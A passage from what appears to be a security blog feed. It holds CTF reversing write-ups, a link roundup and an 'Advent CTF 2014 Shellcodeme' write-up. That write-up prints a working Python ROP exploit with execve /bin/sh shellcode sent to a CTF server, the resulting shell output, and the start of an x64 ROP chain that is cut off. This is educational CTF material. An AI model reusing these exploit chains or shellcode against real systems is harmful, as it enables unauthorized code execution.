<p>The code now sends a message to its message queue, but I didn&rsquo;t know the location of the handler. No worries; I stepped into the call with F7 until I was in NTDLL.dll, and then set a memory breakpoint on the code area at <code>0x401000</code>. A break-on-access also works.</p>

<p><img src="http://barrebas.github.io/assets/hv14/hv14-07.png" alt="" /></p>

<p>After pressing F9, this landed me at the handler!</p>

<p><img src="http://barrebas.github.io/assets/hv14/hv14-08.png" alt="" /></p>

<p>I traced through this function with F7, finally ending up here:</p>

<p><img src="http://barrebas.github.io/assets/hv14/hv14-09.png" alt="" /></p>

<p>The code takes the first four bytes of our input, XORs them with a certain value and then proceeds to call the code at the resulting value&hellip; Only problem is, there was no code at <code>0x703234BD</code>! I remembered the hint I got at the beginning: &ldquo;the flag probably starts with <code>HV14</code>&rdquo;. I changed the input to <code>HV14-ABCD-DEFG-HIJK-LMNO-PQRS</code> and restarted it again, to end up at the same CALL EAX:</p>

<p><img src="http://barrebas.github.io/assets/hv14/hv14-10.png" alt="" /></p>

<p>With a single F7, I ended up here:</p>

<p><img src="http://barrebas.github.io/assets/hv14/hv14-11.png" alt="" /></p>

<p>Here, some tricky stuff starts happening! A call to <code>VirtualProtect</code> makes the code in front of us writeable, and the binary starts modifying that code:</p>

<p><img src="http://barrebas.github.io/assets/hv14/hv14-12.png" alt="" /></p>

<p>Cool <em>and</em> a nice anti-disassembler tactic, this self-modifying code. It can be tricky to reverse, in this case especially the call that emerges:</p>

<p><img src="http://barrebas.github.io/assets/hv14/hv14-13.png" alt="" /></p>

<p>Carefully using F7, I traced passed this anti-disassembler trick and found myself at this CALL ECX:</p>

<p><img src="http://barrebas.github.io/assets/hv14/hv14-14.png" alt="" /></p>

<p>I stepped into it, landing at this position. Now it becomes really interesting, the binary apparently calls a function that does <em>something</em> with our input, then sends another message to the message queue. I decided to place a breakpoint at <code>0x4022B3</code> and pressed F9; I would examine the function later. First see what happens:</p>

<p><img src="http://barrebas.github.io/assets/hv14/hv14-15.png" alt="" /></p>

<p>Indeed, we land at the message handler. After decrypting a string, the binary does a byte-by-byte comparison of our mangled input and some other buffer:</p>

<p><img src="http://barrebas.github.io/assets/hv14/hv14-17.png" alt="" /></p>

<p>The code that comes after it congratulates us, but only if the buffer equals our mangled input. I decided to find out where our input was being mangled. I restarted the binary and set a memory breakpoint on the first four bytes of the input:</p>

<p><img src="http://barrebas.github.io/assets/hv14/hv14-18.png" alt="" /></p>

<p>Pressing F9, the code breaks at the CALL EAX, of course. Another F9 lands us here:</p>

<p><img src="http://barrebas.github.io/assets/hv14/hv14-19.png" alt="" /></p>

<p>Ah! The first byte of our input, &lsquo;H&rsquo;, is being XOR&#8217;ed with another value. This is repeated for all the bytes in the input:</p>

<p><img src="http://barrebas.github.io/assets/hv14/hv14-20.png" alt="" /></p>

<p>I wrote down (literally!) all the values that were used in <code>AL</code> and finally, I ended up at the REPE CMPS instruction:</p>

<p><img src="http://barrebas.github.io/assets/hv14/hv14-21.png" alt="" /></p>

<p>I took note of the values at <code>EDI</code> and together with the values from the XOR statement earlier, I had all the thing necessary to grab the flag! Sprinkle in some Python magic:</p>

<p><img src="http://barrebas.github.io/assets/hv14/hv14-22.png" alt="" /></p>

<p>And we have the flag!</p>

<p><img src="http://barrebas.github.io/assets/hv14/hv14-23.png" alt="" /></p>

<p>It has been a while since I got to use OllyDbg to reverse a Windows binary. Between the self-modifying code, the use of the flag and <code>SendMessage</code> to control code execution, this was a very enjoyable challenge!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Staring Into /dev/null Weekly Roundup]]></title>
    <link href="http://barrebas.github.io/blog/2014/12/27/staring-into-slash-dev-slash-null-weekly-roundup/"/>
    <updated>2014-12-27T09:52:56+01:00</updated>
    <id>http://barrebas.github.io/blog/2014/12/27/staring-into-slash-dev-slash-null-weekly-roundup</id>
    <content type="html"><![CDATA[<p>Extra, extra! Interesting stuff found on the internet in the past week!</p>

<!-- more -->


<p>This week really kicked off some awesome work on format string vulnerabilities! First, <a href="https://twitter.com/leonjza">leonjza</a> shows the process of <a href="https://asciinema.org/a/14960">writing an format string exploit</a> in visual form. Next, <a href="http://r3v3rs3r.wordpress.com">c0ne</a> made a <a href="http://r3v3rs3r.wordpress.com/2014/12/26/i-love-format-string-vulnerabilities/">great script</a> to help with the tedious work that is involved when exploiting format strings.</p>

<p>I came across this technique for <a href="http://www.shelliscoming.com/2014/03/hidden-bind-shell-keep-your-shellcode.html">hiding bind shells</a> by <a href="https://twitter.com/borjamerino">@BorjaMerino</a>. I wonder if it is possible to port this to Linux&hellip;</p>

<p>To combat holiday boredom, a new VM was released on Vulnhub the other day, named <a href="https://www.vulnhub.com/entry/pegasus-1,109/">Pegasus</a> by <a href="https://twitter.com/TheKnapsy">Knapsy</a>. It&rsquo;s a very fun and tricky VM, I recommend it!</p>

<p>Super useful, something I have seen before, but then I lost the link: <a href="http://redsymbol.net/articles/unofficial-bash-strict-mode/">Use the Unofficial Bash Strict Mode (Unless You Looove Debugging)</a> by Aaron Maxwell aka <a href="https://twitter.com/redsymbol/">redsymbol</a>.</p>

<p>Lastly, I always enjoy writeups about breaking botnet panels. This one by Malware Tech <a href="http://www.malwaretech.com/2014/12/phase-bot-exploiting-c-panel.html">is quite entertaining</a>.</p>

<p>I&rsquo;d like to make this a recurring thing. Let me know what you think about it!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Advent CTF 2014 - Bruteforce]]></title>
    <link href="http://barrebas.github.io/blog/2014/12/24/advent-ctf-2014-bruteforce/"/>
    <updated>2014-12-24T11:38:35+01:00</updated>
    <id>http://barrebas.github.io/blog/2014/12/24/advent-ctf-2014-bruteforce</id>
    <content type="html"><![CDATA[<p>Bruteforce they said, it&rsquo;ll be fun, they said&hellip;</p>

<!-- more -->


<p>We&rsquo;re given only a binary and are told that we shouldn&rsquo;t bruteforce the server. The binary, when started, only says &ldquo;calculating&hellip;..&rdquo; and not much else. Upon closer examination, I found that it does some calculations and checks a certain number before printing out the flag:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>   0x400703: movsxd rax,DWORD PTR [rsp+0x8]
</span><span class='line'>=&gt; 0x400708:   cmp    rax,QWORD PTR [rip+0x200969]        # 0x601078
</span><span class='line'>   0x40070f:  je     0x400780
</span><span class='line'>   0x400711:  add    DWORD PTR [rsp+0xc],0x1</span></code></pre></td></tr></table></div></figure>


<p>If <code>eax</code> matches the value at <code>0x601078</code>, then the code jumps here:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>  400780:    8b 54 24 0c             mov    edx,DWORD PTR [rsp+0xc]
</span><span class='line'>  400784: be b1 09 40 00          mov    esi,0x4009b1 ; bruteforce : 0x4009b1 ("the flag is: ADCTF_%d\n")
</span><span class='line'>  400789: bf 01 00 00 00          mov    edi,0x1
</span><span class='line'>  40078e: 31 c0                   xor    eax,eax
</span><span class='line'>  400790: e8 7b fe ff ff          call   400610 &lt;__printf_chk@plt&gt;</span></code></pre></td></tr></table></div></figure>


<p>So the calculates until a certain value is found and then dumps the flag. I found a couple of rate-limiting things, such as these syscalls:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>  4008e0:    49 89 ce                mov    r14,rcx
</span><span class='line'>  4008e3: 48 89 fa                mov    rdx,rdi
</span><span class='line'>  4008e6: 4c 89 d7                mov    rdi,r10
</span><span class='line'>  4008e9: 4c 89 ce                mov    rsi,r9
</span><span class='line'>  4008ec: 48 31 c0                xor    rax,rax
</span><span class='line'>  4008ef: b0 23                   mov    al,0x23  ; nanosleep
</span><span class='line'>  4008f1: 0f 05                   syscall </span></code></pre></td></tr></table></div></figure>


<p>I didn&rsquo;t want to slow it down so I nop&#8217;ed out three of those syscalls, along with the calls to putchar and printf. I ran the binary, occasionaly checking at which it was&hellip; but it still was very slow! Time for a different approach&hellip;</p>

<p>Running the binary and breaking at the comparison at <code>0x400708</code>, I compared the value at <code>rsp+0x8</code> and <code>rsp+0xc</code> (which is used to print out the flag eventually). I noticed these numbers:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>rsp+0x8      rsp+0xc
</span><span class='line'>-------------------
</span><span class='line'>  1           1
</span><span class='line'>  2           2
</span><span class='line'>  3           5
</span><span class='line'>  4           7
</span><span class='line'>  5           11</span></code></pre></td></tr></table></div></figure>


<p>It didn&rsquo;t take me long to realize we&rsquo;re looking at prime numbers here. This binary bruteforces prime numbers and prints out the prime number when the comparison at <code>0x400708</code> is true. <code>eax</code> contains the ordinal number of the last prime found and is compared to <code>0x989680</code>. That would be 10,000,000 in decimal. I quickly located a list of <a href="https://primes.utm.edu/lists/small/millions/">prime numbers</a> and found the 10th million: 179,424,673.</p>

<p>Therefore, the flag was: <code>ADCTF_179424673</code>.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Advent CTF 2014 - Shellcodeme]]></title>
    <link href="http://barrebas.github.io/blog/2014/12/24/advent-ctf-2014-shellcodeme/"/>
    <updated>2014-12-24T11:37:46+01:00</updated>
    <id>http://barrebas.github.io/blog/2014/12/24/advent-ctf-2014-shellcodeme</id>
    <content type="html"><![CDATA[<p>Why o why do we take part in these painful exercises? Again, <code>shellcodeme</code> seemed like such a simple task. But looks, like all the other challenges of Advent CTF 2014, can be deceiving!</p>

<!-- more -->


<p></p>

<p>We&rsquo;re given a binary and the C source code:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cm">/* gcc -m32 -fno-stack-protector -znoexecstack -o shellcodeme shellcodeme.c */</span>
</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;sys/mman.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="cp">#define SHELLCODE_LEN 1024</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="kt">char</span> <span class="o">*</span><span class="n">buf</span><span class="p">;</span>
</span><span class='line'>    <span class="n">buf</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">((</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x20000000</span><span class="p">,</span> <span class="n">SHELLCODE_LEN</span><span class="p">,</span> <span class="n">PROT_READ</span><span class="o">|</span><span class="n">PROT_WRITE</span><span class="o">|</span><span class="n">PROT_EXEC</span><span class="p">,</span> <span class="n">MAP_PRIVATE</span><span class="o">|</span><span class="n">MAP_ANONYMOUS</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span><span class='line'>    <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buf</span><span class="p">,</span> <span class="n">SHELLCODE_LEN</span><span class="p">);</span>
</span><span class='line'>    <span class="n">mprotect</span><span class="p">((</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x20000000</span><span class="p">,</span> <span class="n">SHELLCODE_LEN</span><span class="p">,</span> <span class="n">PROT_READ</span><span class="p">);</span> <span class="c1">// no no no~</span>
</span><span class='line'>    <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">void</span><span class="p">(</span><span class="o">*</span><span class="p">)())</span> <span class="n">buf</span><span class="p">)();</span> <span class="c1">// SEGV! no exec. can you execute shellcode?</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>The bug was kind of obvious:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buf</span><span class="p">,</span> <span class="n">SHELLCODE_LEN</span><span class="p">);</span> <span class="c1">// read to the location of buf itself</span>
</span></code></pre></td></tr></table></div></figure>


<p>The code will read in the shellcode at <code>&amp;buf</code>, not <code>buf</code>. This will allow us to overwrite that pointer and take control of execution at this line of code:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">void</span><span class="p">(</span><span class="o">*</span><span class="p">)())</span> <span class="n">buf</span><span class="p">)();</span> <span class="c1">// SEGV! no exec. can you execute shellcode?</span>
</span></code></pre></td></tr></table></div></figure>


<p>I chose to overwrite the <code>buf</code> pointer with <code>0x080484fc</code>, which is <code>leave; ret</code>. This will restore the stack and land us in my ROP chain. The basic idea is to re-use <code>mprotect</code> and <code>read</code> to read in the shellcode and then return to it. The following python code did just that, landing me a shell on the box:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">struct</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">socket</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">telnetlib</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">time</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">p</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
</span><span class='line'>      <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;L&#39;</span><span class="p">,</span> <span class="n">x</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">POP3RET</span> <span class="o">=</span> <span class="mh">0x804855d</span>
</span><span class='line'><span class="n">MPROTECT</span> <span class="o">=</span> <span class="mh">0x8048330</span>
</span><span class='line'><span class="n">READ</span> <span class="o">=</span> <span class="mh">0x8048340</span>
</span><span class='line'>
</span><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x080484fc</span><span class="p">)</span>        <span class="c"># leave; ret (restore stack)</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;A&quot;</span><span class="o">*</span><span class="mi">12</span>               <span class="c"># dummy </span>
</span><span class='line'>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">MPROTECT</span><span class="p">)</span>          <span class="c"># mprotect shellcode area back to rwx</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">POP3RET</span><span class="p">)</span>           <span class="c"># fix stack</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x20000000</span><span class="p">)</span>       <span class="c"># addr of shellcode</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">)</span>           <span class="c"># size (page-aligned)</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x7</span><span class="p">)</span>              <span class="c"># PROT_READ|PROT_EXEC|PROT_WRITE</span>
</span><span class='line'>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">READ</span><span class="p">)</span>              <span class="c"># read in our shellcode</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">POP3RET</span><span class="p">)</span>           <span class="c"># fix stack</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span>              <span class="c"># stdin</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x20000000</span><span class="p">)</span>       <span class="c"># address</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>             <span class="c"># copied value</span>
</span><span class='line'>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x20000000</span><span class="p">)</span>       <span class="c"># return to shellcode</span>
</span><span class='line'>
</span><span class='line'><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;pwnable.katsudon.org&#39;</span><span class="p">,</span> <span class="mi">33201</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'><span class="c"># send first stage</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># for some reason, this delay was necessary</span>
</span><span class='line'><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.05</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># send shellcode, spawns /bin/sh</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\x31\xc9\xf7\xe9\x51\x04\x0b\xeb\x08\x5e\x87\xe6\x99\x87\xdc\xcd\x80\xe8\xf3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x2f\x73\x68</span><span class="s">&quot;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">t</span> <span class="o">=</span> <span class="n">telnetlib</span><span class="o">.</span><span class="n">Telnet</span><span class="p">()</span>
</span><span class='line'><span class="n">t</span><span class="o">.</span><span class="n">sock</span> <span class="o">=</span> <span class="n">s</span>
</span><span class='line'><span class="n">t</span><span class="o">.</span><span class="n">interact</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>I thought I was home-free! Let&rsquo;s cat that flag and be done with it! But what&rsquo;s this? (Yes, I&rsquo;ve started using kali! =))</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# python exploit.py
</span><span class='line'>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>shellcodeme<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>shellcodeme<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>shellcodeme<span class="o">)</span>
</span><span class='line'>ls -alh
</span><span class='line'>total 36K
</span><span class='line'>dr-xr-xr-x <span class="m">2</span> root shellcodeme2 4.0K Dec <span class="m">22</span> 22:09 .
</span><span class='line'>drwxr-xr-x <span class="m">3</span> root root         4.0K Dec <span class="m">22</span> 22:09 ..
</span><span class='line'>-rw-r--r-- <span class="m">1</span> root shellcodeme2  <span class="m">220</span> Sep <span class="m">26</span> 04:49 .bash_logout
</span><span class='line'>-rw-r--r-- <span class="m">1</span> root shellcodeme2 3.4K Sep <span class="m">26</span> 04:49 .bashrc
</span><span class='line'>-rw-r--r-- <span class="m">1</span> root shellcodeme2  <span class="m">675</span> Sep <span class="m">26</span> 04:49 .profile
</span><span class='line'>-r--r----- <span class="m">1</span> root shellcodeme2   <span class="m">34</span> Dec <span class="m">22</span> 22:09 flag
</span><span class='line'>-r-xr-sr-x <span class="m">1</span> root shellcodeme2 8.5K Dec <span class="m">22</span> 22:09 shellcodeme2
</span><span class='line'>cat flag 2&gt;<span class="p">&amp;</span>1
</span><span class='line'>cat: flag: Permission denied
</span></code></pre></td></tr></table></div></figure>


<p>Gah! We need to exploit another binary! This one is the same C code, but compiled as x64 code&hellip; I transferred the binary over to my box and started poking it.</p>

<p>The basic solution stays the same: mprotect, read, shellcode, flag. The problem with x64 is that we cannot pass the arguments to calls on the stack: that goes via registers. The two functions I needed are here:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>   0x00000000004005f2 &lt;+53&gt;:   mov    edx,0x400
</span><span class='line'>   0x00000000004005f7 &lt;+58&gt;:    mov    rsi,rax
</span><span class='line'>   0x00000000004005fa &lt;+61&gt;:    mov    edi,0x0
</span><span class='line'>   0x00000000004005ff &lt;+66&gt;:    mov    eax,0x0
</span><span class='line'>   0x0000000000400604 &lt;+71&gt;:    call   0x400490 &lt;<span class="nb">read</span>@plt&gt;
</span><span class='line'>   0x0000000000400609 &lt;+76&gt;:    mov    edx,0x1
</span><span class='line'>   0x000000000040060e &lt;+81&gt;:    mov    esi,0x400
</span><span class='line'>   0x0000000000400613 &lt;+86&gt;:    mov    edi,0x20000000
</span><span class='line'>   0x0000000000400618 &lt;+91&gt;:    call   0x4004c0 &lt;mprotect@plt&gt;
</span></code></pre></td></tr></table></div></figure>


<p>I uploaded the binary to <a href="https://ropshell.com">ropshell.com</a> and analyzed it to find the gadgets I&rsquo;d need. I found <code>esi/rsi</code> and <code>edi/rdi</code> quickly, but <code>edx/rdx</code> was nowhere to be found. Finally, I located these two gadgets:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>0x0040068a : pop rbx<span class="p">;</span> pop rbp<span class="p">;</span> pop r12<span class="p">;</span> pop r13<span class="p">;</span> pop r14<span class="p">;</span> pop r15<span class="p">;</span> ret
</span><span class='line'>0x00400671 : mov edx, ebp<span class="p">;</span> mov rsi, r14<span class="p">;</span> mov edi, r15d<span class="p">;</span> call <span class="o">[</span>r12 + rbx*8<span class="o">]</span>
</span></code></pre></td></tr></table></div></figure>


<p>Prepare for some mind-bending ROP chains&hellip;</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
</span><span class='line'>
</span><span class='line'><span class="kn">import</span> <span class="nn">struct</span>
</span><span class='line'><span class="k">def</span> <span class="nf">p</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&quot;L&quot;</span><span class="p">,</span> <span class="n">x</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="sd">&#39;&#39;&#39;</span>
</span><span class='line'><span class="sd">   #0x0040068a : pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret</span>
</span><span class='line'><span class="sd">   #0x00400671 : mov edx, ebp; mov rsi, r14; mov edi, r15d; call [r12 + rbx*8]</span>
</span><span class='line'><span class="sd">&#39;&#39;&#39;</span>
</span><span class='line'>
</span><span class='line'><span class="c"># first, fix up stack   </span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x00400690</span><span class="p">)</span>   <span class="c"># pop pop ret</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c">#### MPROTECT</span>
</span><span class='line'><span class="c"># gadgets to set edi, esi and edx and call mprotect</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x0040068a</span><span class="p">)</span>   <span class="c"># pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x6</span><span class="p">)</span>          <span class="c"># rbx   &lt;&lt; needs to be ebp-1 for code path!</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x7</span><span class="p">)</span>          <span class="c"># rbp -&gt; edx = mprotect.mask</span>
